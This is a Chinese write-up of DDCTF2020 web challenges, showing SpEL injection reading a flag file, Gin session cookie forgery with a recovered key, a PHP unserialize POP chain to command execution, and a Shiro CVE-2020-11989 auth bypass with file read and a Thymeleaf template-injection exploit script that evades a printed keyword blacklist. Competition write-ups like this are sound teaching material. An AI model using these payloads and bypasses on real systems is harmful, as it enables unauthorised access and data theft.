date: 2020-09-07
categories:
- 比赛
tags:
- ctf,wp
title:  DDCTF2020
---
# DDCTF2020



## 拼图游戏

纯手工

![image80](https://raw.githubusercontent.com/Explorersss/photo/master/20200906061331.png)



## Web签到题

根据题目提示得到两个接口

```
Method | POST
URL    | http://117.51.136.197/admin/login
Param  | username str | pwd str
Response
token str | auth(Certification information)

- auth interface
Request
Method | POST
URL    | http://117.51.136.197/admin/auth
Param  | username str | pwd str | token str
Response
```

用c-jwt-cracker爆破login生成的jwt

得到下一步入口：

```
client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client
```

是一个go文件，叫二进制队友来逆

得到收发脚本：

```python
import hmac
import base64
import time
import requests
t = time.time()
print(t)
t = str(t)

t = t[:10]
cmd="99-9"
s = "{}|".format(cmd) + t
print(s)
t = bytes(s, encoding = "utf8")
message = t
key = b'DDCTFWithYou'
h = hmac.new(key,message,digestmod='SHA256')
signature=base64.b64encode(h.digest()).decode()


burp0_url = "http://117.51.136.197:80/server/command"
burp0_headers = {"User-Agent": "Go-http-client/1.1", "Content-Type": "application/json", "Accept-Encoding": "gzip"}
burp0_json={"signature":signature ,"command": cmd,  "timestamp": s[-10:]}
print(burp0_json)
r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies={"http":""})
print(r.text)
```

但是在这里我卡住了，因为client是用go写的我也理所当然的认为后端也是用

go写的，于是就去试go的各种eval框架都不行，最后还是在别人的提示下才走出误区（应该写一个测试SSTI，eval等等的fuzz字典），经过一天的折腾后发现是SPeL

去网上找到了Ying师傅的payload

`NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/home/dc2-user/flag/flag.txt')))).nextLine()`

`DDCTF{Q24uf486whGOWN44UtZCjYUgdnnnRaVs}`

## 卡片商店

目标是让我们拿到100个卡片，但是有时间限制，利用借入和借出来获得100个卡片显然是不现实的。

刚开始想的是条件竞争，后来测试后发现不行，在这里我被卡住了。

继续测试发现，这里存在着整数溢出漏洞（卡片数是个大整数，而借入借出是个小整数），我们让卡片数不溢出，而借入数溢出，就可以得到许多卡片。接着我们得到了一个SecKey和获取flag的地址：`/flag`，但是需要我们是admin账号

`session:MTU5OTIyNTI5MXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl5TlRJNU1Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXlOVEk1TVgwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfMaqAqFFw43-8z8EcAFY04oenUI0FyhjaW8KZXGH2uSX`

对session进行解密发现,他的格式类似：`base64encode(timestamp|base64urlencode(gob)|check)`

利用https://gitlab.com/drosseau/degob 获得gob内容

`map[interface{}]interface{}{"admin": false,"wallet": "{"owings":[{"OwingMoney":100000,"NeedMoney":100002,"OwingTime":1599223614}],"invests":[{"InvestMoney":100006,"ReceiveMoney":100009,"InvestTime":1599223644}],"money":0,"now_time":1599222955,"start_time":1599222835}"}`

显然我们需要修改admin的值，在云屿师傅的帮助下知道了这是一个gin生成的session

```go
package main

import (
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
)

func main() {
        r := gin.Default()
        store := cookie.NewStore([]byte("Udc13VD5adM_c10nPxFu@v12"))
        r.Use(sessions.Sessions("session", store))

        r.GET("/incr", func(c *gin.Context) {
                session := sessions.Default(c)
                var count bool
                v := session.Get("admin")
                if v == nil {
                        count = true
                } else {
                        count = v.(bool)
                        count = true
                }
                session.Set("admin", count)
                session.Save()
                c.JSON(200, gin.H{"admin": count})
        })
        r.Run(":8000")
}
```

得到flag:`DDCTF{Th151s3AsY4ormE2333!}`

## Overwrite Me

题目环境：PHP/5.6.10

题目源码：

```php
Welcome to DDCTF 2020, Have fun!

<?php
error_reporting(0);

class MyClass
{
    var $kw0ng;
    var $flag;

    public function __wakeup()
    {
        $this->kw0ng = 2;
    }

    public function get_flag()
    {
        return system('find /HackersForever ' . escapeshellcmd($this->flag));
    }
}

class HintClass
{   
    protected  $hint;
    public function execute($value)
    {
        include($value);
    }

    public function __invoke()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i", $this->hint))
        {
            die("Don't Do That!");
        }
        $this->execute($this->hint);
    }
}

class ShowOff
{
    public $contents;
    public $page;
    public function __construct($file='/hint/hint.php')
    {
        $this->contents = $file;
        echo "Welcome to DDCTF 2020, Have fun!<br/><br/>";
    }
    public function __toString()
    {
        return $this->contents();
    }

    public function __wakeup()
    {
        $this->page->contents = "POP me! I can give you some hints!";
        unset($this->page->cont);
    }
}

class MiddleMan
{
    private $cont;
    public $content;
    public function __construct()
    {
        $this->content = array();
    }

    public function __unset($key)
    {
        $func = $this->content;
        return $func();
    }
}

class Info
{
    function __construct()
    {
        eval('phpinfo();');
    }

}

$show = new ShowOff();
$bullet = $_GET['bullet'];

if(!isset($bullet))
{
    highlight_file(__FILE__);
    die("Give Me Something!");
}else if($bullet == 'phpinfo')
{
    $infos = new Info();
}else
{
    $obstacle1 = new stdClass;
    $obstacle2 = new stdClass;
    $mc = new MyClass();
    $mc->flag = "MyClass's flag said, Overwrite Me If You Can!";
    @unserialize($bullet);
    echo $mc->get_flag();
}
```

直接访问hint.php

得到：`Good Job! You've got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i'll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!`



看样子是要让我们利用GMP打他

这里不急先分析一下代码，构思一下可以利用的反序列化链

`ShowOff::__wakeup->MiddleMan::__unset->$func();` 

令`$func=[MyClass,"get_flag"]`实现任意命令执行，结束（GMP就不见了，盲猜出题人没限制好）



## Easy Web

第一次熬夜杠题，真爽

登陆失败后响应体出现：`RememberMe=DeleteMe`，shiro稳了

尝试一下Shiro 反序列化，果然GG

https://shiro.apache.org/security-reports.html

去官网看下CVE，试一下发现存在CVE-2020-11989

http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index

绕过权限验证，发现任意文件读取接口

`http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg`

（原本是想直接读取Shiro的key来直接打穿的，搞了好久都没找到）

常规思路：

1. 先读取 web.xml

   ```xml
   <web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
   version="3.0" metadata-complete="false">
     <display-name>Archetype Created Web Application</display-name>
     <context-param>
       <param-name>contextConfigLocation</param-name>
       <param-value>classpath:spring-core.xml</param-value>
     </context-param>
     <listener>
       <listener-class>org.springframework.web.util.WebAppRootListener</listener-class>
     </listener>
     <listener>
       <listener-class>org.springframework.web.util.IntrospectorCleanupListener</listener-class>
     </listener>
     <listener>
       <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
     </listener>
     <servlet>
       <servlet-name>springmvc</servlet-name>
       <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
       <init-param>
         <param-name>contextConfigLocation</param-name>
         <param-value>classpath:spring-web.xml</param-value>
       </init-param>
     </servlet>
     <servlet-mapping>
       <servlet-name>springmvc</servlet-name>
       <url-pattern>/</url-pattern>
     </servlet-mapping>
     <filter>
       <filter-name>encodingFilter</filter-name>
       <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
       <init-param>
         <param-name>encoding</param-name>
         <param-value>UTF-8</param-value>
       </init-param>
       <init-param>
         <param-name>forceEncoding</param-name>
         <param-value>true</param-value>
       </init-param>
     </filter>
     <filter-mapping>
       <filter-name>encodingFilter</filter-name>
       <url-pattern>/*</url-pattern>
     </filter-mapping>
     <filter>
       <filter-name>safeFilter</filter-name>
       <filter-class>com.ctf.util.SafeFilter</filter-class>
     </filter>
     <filter-mapping>
       <filter-name>safeFilter</filter-name>
       <url-pattern>/*</url-pattern>
     </filter-mapping>
     <filter>
       <filter-name>shiroFilter</filter-name>
       <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
       <init-param>
         <param-name>targetFilterLifecycle</param-name>
         <param-value>true</param-value>
       </init-param>
     </filter>
     <filter-mapping>
       <filter-name>shiroFilter</filter-name>
       <url-pattern>/*</url-pattern>
     </filter-mapping>
     <error-page>
       <error-code>500</error-code>
       <location>/error.jsp</location>
     </error-page>
     <error-page>
       <error-code>404</error-code>
       <location>/hacker.jsp</location>
     </error-page>
     <error-page>
       <error-code>403</error-code>
       <location>/hacker.jsp</location>
     </error-page>
   </web-app>
   ```

2. 依次读取class文件：
   http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class

   ```java
   package com.ctf.util;
   
   import java.io.IOException;
   import java.util.Enumeration;
   import java.util.regex.Matcher;
   import java.util.regex.Pattern;
   import javax.servlet.Filter;
   import javax.servlet.FilterChain;
   import javax.servlet.FilterConfig;
   import javax.servlet.ServletException;
   import javax.servlet.ServletRequest;
   import javax.servlet.ServletResponse;
   import javax.servlet.http.HttpServletResponse;
   
   public class SafeFilter
     implements Filter
   {
     private final String encoding = "UTF-8";
     private static String[] blacklists = { "java.+lang", "Runtime|Process|byte|OutputStream|session|\"|'", "exec.*\\(", "write|read", "invoke.*\\(", "\\.forName.*\\(", "lookup.*\\(", "\\.getMethod.*\\(", "javax.+script.+ScriptEngineManager", "com.+fasterxml", "org.+apache", "org.+hibernate", "org.+thymeleaf", "javassist", "javax\\.", "eval.*\\(", "\\.getClass\\(", "org.+springframework", "javax.+el", "java.+io" };
     
     public void init(FilterConfig arg0)
       throws ServletException
     {}
     
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
       throws IOException, ServletException
     {
       request.setCharacterEncoding("UTF-8");
       response.setCharacterEncoding("UTF-8");
       Enumeration pNames = request.getParameterNames();
       while (pNames.hasMoreElements())
       {
         String name = (String)pNames.nextElement();
         String value = request.getParameter(name);
         for (String blacklist : blacklists)
         {
           Matcher matcher = Pattern.compile(blacklist, 34).matcher(value);
           if (matcher.find())
           {
             HttpServletResponse servletResponse = (HttpServletResponse)response;
             servletResponse.sendError(403);
           }
         }
       }
       filterChain.doFilter(request, response);
     }
     
     public void destroy() {}
   }
   
   ```

   然后其他的被waf过滤了
   读取web.xml中的其他配置文件

   http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:p="http://www.springframework.org/schema/p"
   xmlns:aop="http://www.springframework.org/schema/aop"
   xmlns:context="http://www.springframework.org/schema/context"
   xmlns:jee="http://www.springframework.org/schema/jee"
   xmlns:tx="http://www.springframework.org/schema/tx"
   xsi:schemaLocation="http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd
   http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
   http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd
   http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd
   http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd">
     <import resource="classpath:spring-shiro.xml" />
     <!-- 声明自动为spring容器中那些配置@Aspectj切面的bean创建代理，织入切面 -->
     <aop:aspectj-autoproxy></aop:aspectj-autoproxy>
     <!-- 支持事物注解（@Transactional） -->
     <tx:annotation-driven/>
     <bean id="viewResolver" class="org.thymeleaf.spring4.view.ThymeleafViewResolver">
       <property name="order" value="1"/>
       <property name="characterEncoding" value="UTF-8"/>
       <property name="templateEngine" ref="templateEngine"/>
     </bean>
     <bean id="templateEngine" class="org.thymeleaf.spring4.SpringTemplateEngine">
       <property name="templateResolver" ref="templateResolver" />
     </bean>
     <bean id="templateResolver" class="org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver">
       <property name="prefix" value="/WEB-INF/templates/"/>
       <property name="suffix" value=".html"/>
       <property name="templateMode" value="HTML5"/>
       <property name="cacheable" value="false"/>
       <property name="characterEncoding"  value="UTF-8" />
     </bean>
     <context:annotation-config />
     <context:component-scan base-package="com.ctf">
       <context:include-filter type="annotation" expression="org.springframework.stereotype.Service" />
       <context:include-filter type="annotation" expression="org.springframework.stereotype.Repository" />
     </context:component-scan>
   </beans>
   ```

   http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:context="http://www.springframework.org/schema/context"
   xmlns:mvc="http://www.springframework.org/schema/mvc"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd">
     <!-- 自动扫描 Controller 包 -->
     <context:component-scan base-package="com.ctf.controller"/>
     <context:component-scan base-package="com.ctf.repository"/>
     <context:component-scan base-package="com.ctf.service"/>
     <!-- 注解配置和乱码处理 -->
     <mvc:annotation-driven>
       <mvc:message-converters>
         <bean class="org.springframework.http.converter.StringHttpMessageConverter">
           <constructor-arg value="UTF-8"/>
         </bean>
       </mvc:message-converters>
     </mvc:annotation-driven>
     <mvc:default-servlet-handler/>
   </beans>
   ```

   猜测他们的Auth，Login等对应的Controller类名
   http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class

   

   

   http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class

   拿到Admin的路由：`http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index`，同样权限绕过
   发现提示Render，盲猜又是SSTI

   检测JAVA的SSTI发现`[[${7*7}]]`成功执行，这是一个Thymeleaf 模板注入

进入下一步SSTI

ctfFilter过滤了：

```java
private static String[] blacklists = { "java.+lang", "Runtime|Process|byte|OutputStream|session|\"|'", "exec.*\\(", "write|read", "invoke.*\\(", "\\.forName.*\\(", "lookup.*\\(", "\\.getMethod.*\\(", "javax.+script.+ScriptEngineManager", "com.+fasterxml", "org.+apache", "org.+hibernate", "org.+thymeleaf", "javassist", "javax\\.", "eval.*\\(", "\\.getClass\\(", "org.+springframework", "javax.+el", "java.+io" };
```

利用Thymeleaf 特性绕过

`[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]]`



exp:

```python
import requests
import re
import gen
#  private static String[] blacklists = { "java.+lang", "Runtime|Process|byte|OutputStream|session|\"|'", "exec.*\\(", "write|read", "invoke.*\\(", "\\.forName.*\\(", 
# "lookup.*\\(", "\\.getMethod.*\\(", 
# "javax.+script.+ScriptEngineManager", "com.+fasterxml", "org.+apache", "org.+hibernate", "org.+thymeleaf", "javassist", "javax\\.", "eval.*\\(", "\\.getClass\\(",
#  "org.+springframework", "javax.+el", "java.+io" };

code = "param.foo"
payload ='''<p th:text=${%s}></p>'''%code
cmd=payload
cmd="""[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]] """
print(cmd)
burp0_url = "http://116.85.37.131:80/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://116.85.37.131", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_data = {"content": cmd}
response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text

try:
    redirect = re.search('fetch \./(.*) !', response).group(1)
except :
    print(response)
url = 'http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/'
url += redirect

print(requests.get(url,params={"foo":"NEW java.util.Scanner(NEW java.i@o.BufferedRea@der(new java.i@o.Fi@leRe@ad@er(new java.i@o.Fi@le("+gen.gen("/flag_is_here")+")))).nextLine()","bbb":'@',"t":"",'g':'ls'},proxies={"http":"http://127.0.0.1:8080"}).text)
```

